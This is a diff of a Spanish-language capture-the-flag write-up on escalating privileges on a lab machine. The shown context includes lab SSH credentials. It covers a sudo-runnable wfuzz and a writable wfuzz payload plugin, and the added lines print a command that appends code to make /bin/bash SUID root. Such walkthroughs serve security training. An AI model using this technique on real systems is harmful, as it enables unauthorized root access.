@@ -42,11 +42,16 @@ ben:B3nP4zz
 Probaremos a usarlas en el *SSH* `ssh ben@192.168.1.93` obtendremos acceso a la maquina
 
 #### Escalada de privilegios
-### Enumeracion
+### Enumeración
 **SUDO -L**  el usuario `BEN` puede ejecutar como root el binario `wfuzz`
 
 **SUID**  buscamos permisos de escritura sobre todos los archivos de la maquina con
 `find / -writable 2>/dev/null |grep -vE "proc|sys|tmp|run|dev|home|var"`
+### Explotación
 
 Encontrando así el archivo `/usr/lib/python3/dist-packages/wfuzz/plugins/payloads/range.py`
+que es un archivo que pertenece a [[WFUZZ]] viendo con el parámetro `help` de esta herramienta, encontramos que la opción `-z` permite incluir unos payloads específicos
+
+Al tener permisos de escritura sobre el modulo mencionado anteriormente lo modificamos para cambiar los permisos SUID de la `bash` y así poder ejecutarla como root
+`echo -e 'import os\nos.system("chmod 4755 /bin/bash")' >> /usr/lib/python3/dist-packages/wfuzz/plugins/payloads/range.py`
 
